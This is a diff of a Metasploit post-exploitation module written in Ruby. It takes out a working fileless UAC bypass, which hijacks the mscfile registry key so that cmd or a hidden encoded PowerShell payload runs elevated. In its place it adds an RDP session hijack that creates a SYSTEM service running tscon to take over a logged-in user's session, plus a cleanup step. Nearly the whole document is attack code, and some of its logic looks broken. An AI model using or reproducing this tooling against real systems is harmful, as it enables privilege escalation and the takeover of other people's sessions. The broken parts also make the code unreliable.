@@ -30,12 +30,10 @@
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on     => set SESSION 3
-# The cmd.exe command to be executed (target)  => set EXEC_COMMAND start firefox.exe www.househot.com
-# Check target vulnerability settings/status?  => set CHECK_VULN true
-# Delete malicious registry hive keys/values?  => set DEL_REGKEY true
-# Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
-# The binary.exe vulnerable?                   => set VUL_SOFT CompMgmtLauncher.exe
+# The session number to run this module on  => set SESSION 3
+# Check available IDs in target system      => set CHECK_ID true
+# The Session ID to be hijacked (eg 1)      => set HIJACK_ID 1
+# Delete malicious service created?         => set DEL_SERVICE true
 #
 #
 #
@@ -110,8 +108,8 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover: korznikov',                   # vuln discover credits
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
-                        'DisclosureDate' => 'mar 19 2017',
+                        'Version'        => '$Revision: 1.1',
+                        'DisclosureDate' => 'mar 21 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true',    # requires a privilege session ..
@@ -131,7 +129,8 @@ class MetasploitModule < Msf::Post
                                 ],
 			'DefaultOptions' =>
 				{
-                                         'SESSION' => '1',            # Default its to run againts session 1
+                                         'SESSION' => '1',     # Default its to run againts session 1
+                                         'HIJACK_ID' => '1',   # Default its to run againts user id 1
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -140,8 +139,8 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptBool.new('HIJACK_ID', [ false, 'Session ID to be hijaced (eg 1)' , false]),
-                                OptBool.new('CHECK_USERS', [ false, 'Check available IDs in target system' , false])
+                                OptBool.new('CHECK_ID', [ false, 'Check available IDs in target system' , false]),
+                                OptBool.new('HIJACK_ID', [ false, 'The Session ID to be hijacked (eg 1)' , false])
                         ], self.class)
 
                 register_advanced_options(
@@ -155,112 +154,32 @@ class MetasploitModule < Msf::Post
 
 
 
-# -------------------------------------------------------
-# GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
-# -------------------------------------------------------
+# --------------------------
+# CHECK TARGET IDs AVAILABLE
+# --------------------------
 def ls_stage1
 
 session = client
-# arch = client.fs.file.expand_path("%ComSpec%")
-# check target arch (to inject into powershell string)
-arch_check = client.fs.file.expand_path("%Windir%\\SysWOW64")
-if arch_check == "C:\\Windows\\SysWOW64"
-  arch = "SysWOW64"
+com_query = "query user"
+# check for proper config settings enter
+# to prevent 'unset all' from deleting default options...
+if datastore['CHECK_ID'] == 'nil'
+  print_error("Options not configurated correctly...")
+  print_warning("Please set CHECK_ID option!")
+  return nil
 else
-  arch = "System32"
+  print_status("Reporting logged users ids available!")
+  Rex::sleep(1.5)
 end
 
   r=''
-  vul_serve = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
-  # vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
-  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
-  uac_level = "ConsentPromptBehaviorAdmin" # uac level key
-  comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
-  regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
-  psh_lpath = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
-  psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
-  uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
-  # check for proper config settings enter
-  # to prevent 'unset all' from deleting default options...
-  if datastore['EXEC_COMMAND'] == 'nil'
-    print_error("Options not configurated correctly...")
-    print_warning("Please set EXEC_COMMAND option!")
-    return nil
-  else
-    print_status("Hijacking #{vul_serve} process!")
-    Rex::sleep(1.5)
-  end
-
-    # search in target regedit if eventvwr calls mmc.exe
-    print_warning("Reading process registry hive keys...")
-    Rex::sleep(1.0)
-    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
-      print_good(" exec => remote registry hive key found!")
-      Rex::sleep(1.0)
-    else
-      # registry hive key not found, aborting module execution.
-      print_warning("Hive key: HKCR\\mscfile\\shell\\open\\command (mmc.exe call)")
-      print_error("[ABORT]: module cant find the registry hive key needed...")
-      print_error("System does not appear to be vulnerable to the exploit code!")
-      print_line("")
-      Rex::sleep(1.0)
-      return nil
-    end
-
-      # check target UAC settings (always notify - will abort module execution)
-      check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
-      # a dword:2 value it means 'always notify' setting is active.
-      if check_success == 2
-        print_warning("Target UAC set to: #{check_success} (always notify)")
-        print_error("[ABORT]: module can not work under this condictions...")
-        print_error("Remote system its not vulnerable to the exploit code!")
-        print_line("")
-        Rex::sleep(1.0)
-        return nil
-      # a dword:nil value it means that we are running againts a 'non-uac-system'
-      elsif check_success.nil?
-        print_warning("UAC DWORD DATA EMPTY (NON-UAC-SYSTEM?)")
-        print_error("[ABORT]: module can not work under this condictions...")
-        print_error("Remote system its not vulnerable to the exploit code!")
-        print_line("")
-        Rex::sleep(1.0)
-        return nil
-      else
-        # all good in UAC settings :D
-        print_good(" exec => Target UAC set to: #{check_success} (exploitable)")
-        Rex::sleep(1.0)
-      end
-
-        #
-        # chose to execute a single command in cmd.exe syntax logic
-        # or to execute a shellcode(base64) string using powershell.exe
-        #
-        if datastore['USE_POWERSHELL'] == true
-          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
-          print_good(" exec => Injecting shellcode(base64) string (powershell.exe)")
-          Rex::sleep(1.0)
-        else
-          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
-          print_good(" exec => Injecting cmd command string (cmd.exe)")
-          Rex::sleep(1.0)
-        end
-
- # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
- print_good(" exec => Hijacking process to gain code execution...")
- r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
- # give a proper time to refresh regedit 'enigma0x3' :D
- Rex::sleep(4.5)
-
-      # start remote service to gain code execution
-      print_good(" exec => Starting #{vul_serve} native process...")
-      r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
-      Rex::sleep(1.0)
+  print_line("")
+  # querying target logged users ids
+  r = session.sys.process.execute("cmd.exe /c #{com_query}", nil, {'Hidden' => true, 'Channelized' => true})
 
     # close channel when done
-    print_status("UAC-RCE Credits: enigma0x3 + @mattifestation")
     print_line("")
+    Rex::sleep(1.0)
     r.channel.close
     r.close
 
@@ -272,58 +191,64 @@ end
 
 
 
-# ----------------------------------------------------
-# DELETE MALICIOUS REGISTRY ENTRY (process hijacking)
-# ----------------------------------------------------
+# -----------------------------------------------
+# GAIN REMOTE CODE EXCUTION BY CREATING A SERVICE
+# -----------------------------------------------
 def ls_stage2
 
   r=''
   session = client
-  reg_clean = "REG DELETE HKCU\\Software\\Classes\\mscfile /f" # registry hive to be clean
+  com_useid = datastore['HIJACK_ID'] # user id to be hijacked
+  com_start = "net start sesshijack" # start malicious service
+  com_comps = "%systemdrive%\\system32\\cmd.exe" # cmd.exe compspec path
+  com_execs = "sc create sesshijack binpath= \"#{com_comps} /k tscon #{com_useid} /dest:rdp-tcp#55\"" # create service
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
-  if datastore['DEL_REGKEY'] == 'nil'
+  if datastore['HIJACK_ID'] == 'nil'
     print_error("Options not configurated correctly...")
-    print_warning("Please set DEL_REGKEY option!")
+    print_warning("Please set HIJACK_ID option!")
     return nil
   else
-    print_status("Revert binary.exe process hijack!")
+    print_status("Hijacking RDP process!")
     Rex::sleep(1.5)
   end
 
-    # search in target regedit if hijacking method allready exists
-    print_warning("Reading process registry hive keys...")
+    #
+    # TODO: check rdp service name in taskmanager
+    # Search in target if service its active
+    #
+    print_warning("Searching for RDP service existence ..")
     Rex::sleep(1.0)
-    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
-      print_good(" exec => Remote registry hive key found!")
-      Rex::sleep(1.0)
-    else
-       # registry hive key not found, aborting module execution.
-       print_warning("Hive key: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
-       print_error("[ABORT]: module cant find the registry hive key needed...")
-       print_error("System does not appear to be vulnerable to the exploit code!")
-       print_line("")
-       Rex::sleep(1.0)
-       return nil
-    end
-
- # Delete hijacking hive keys from target regedit...
- # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
- print_good(" exec => Deleting HKCU hive registry keys...")
- r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
- # give a proper time to refresh regedit
- Rex::sleep(3.0)
-
-      # check if remote registry hive keys was deleted successefuly
-      if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
-        print_error("Module can not verify if deletion has successefully!")
+    session.sys.process.get_processes().each do |x|
+      if x['name'].downcase == "rdp.exe"
+        print_good("process RDP found running ..")
+        Rex::sleep(1.0)
       else
-        print_status("Registry hive keys deleted successefuly!")
+        # service not found running in target system
+        print_error("[ABORT]: module cant find service ..")
+        print_warning("System does not appear to be vulnerable to the exploit code!")
+        print_line("")
+        Rex::sleep(1.0)
+        return nil
       end
 
-    Rex::sleep(1.0)
+ #
+ # Execute process hijacking in registry
+ # sc create sesshijack binpath= "%systemdrive%\system32\cmd.exe /k tscon 1 /dest:rdp-tcp#55
+ #
+ print_good(" exec => Creating service to gain code execution...")
+ r = session.sys.process.execute("cmd.exe /c #{com_execs}", nil, {'Hidden' => true, 'Channelized' => true})
+ print_good(" exec => #{com_execs}")
+ # give a proper time to refresh regedit 'enigma0x3' :D
+ Rex::sleep(4.5)
+
+      # start remote service to gain code execution
+      print_good(" exec => Starting sesshijack service ..")
+      r = session.sys.process.execute("cmd.exe /c #{com_start}", nil, {'Hidden' => true, 'Channelized' => true})
+      Rex::sleep(1.0)
+
     # close channel when done
-    print_status("process hijack reverted to default stage!")
+    print_status("Session hijack Credits: @korznikov")
     print_line("")
     r.channel.close
     r.close
@@ -334,6 +259,41 @@ def ls_stage2
 end
 
 
+
+
+# --------------------------------------------
+# DELETE MALICIOUS SERVICE (session hijacking)
+# --------------------------------------------
+def ls_stage3
+
+  r=''
+  session = client
+  com_delet = "sc delete sesshijack" # malicious service to delete
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options...
+  if datastore['DEL_SERVICE'] == 'nil'
+    print_error("Options not configurated correctly...")
+    print_warning("Please set DEL_SERVICE option!")
+    return nil
+  else
+    print_status("Delete malicious sesshijack service!")
+    Rex::sleep(1.5)
+  end
+
+  print_line("")
+  # delete malicious service on target
+  r = session.sys.process.execute("cmd.exe /c #{com_delet}", nil, {'Hidden' => true, 'Channelized' => true})
+
+    # close channel when done
+    print_line("")
+    Rex::sleep(1.0)
+    r.channel.close
+    r.close
+
+  # error exception funtion
+  rescue ::Exception => e
+  print_error("Error: #{e.class} #{e}")
+end
 
 
 
@@ -356,10 +316,10 @@ def run
 
 
     # Print banner and scan results on screen
-    print_line("    +----------------------------------------------+")
-    print_line("    | enigma fileless UAC bypass command execution |")
-    print_line("    |            Author : r00t-3xp10it             |")
-    print_line("    +----------------------------------------------+")
+    print_line("    +---------------------------------------------+")
+    print_line("    |   hijack currently logged in user session   |")
+    print_line("    |            Author : r00t-3xp10it            |")
+    print_line("    +---------------------------------------------+")
     print_line("")
     print_line("    Running on session  : #{datastore['SESSION']}")
     print_line("    Computer            : #{sysnfo['Computer']}")
@@ -375,6 +335,12 @@ def run
     # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
+    # check if we are running againts a priviliged session 
+    if not runtor == "NT AUTHORITY/SYSTEM"
+      print_error("[ ABORT ]: This module only works in a priviliged session")
+      print_warning("This module requires NT AUTHORITY/SYSTEM privs to run")
+      return nil
+    end
     # check for proper operative system (windows-not-wine)
     if not oscheck == "Windows_NT"
       print_error("[ ABORT ]: This module only works againts windows systems")
@@ -394,15 +360,20 @@ def run
     end
 
 
+
 # ------------------------------------
 # Selected settings to run
 # ------------------------------------
-      if datastore['EXEC_COMMAND']
+      if datastore['CHECK_ID']
          ls_stage1
       end
 
-      if datastore['DEL_REGKEY']
+      if datastore['HIJACK_ID']
          ls_stage2
+      end
+
+      if datastore['DEL_SERVICE']
+         ls_stage3
       end
    end
 end
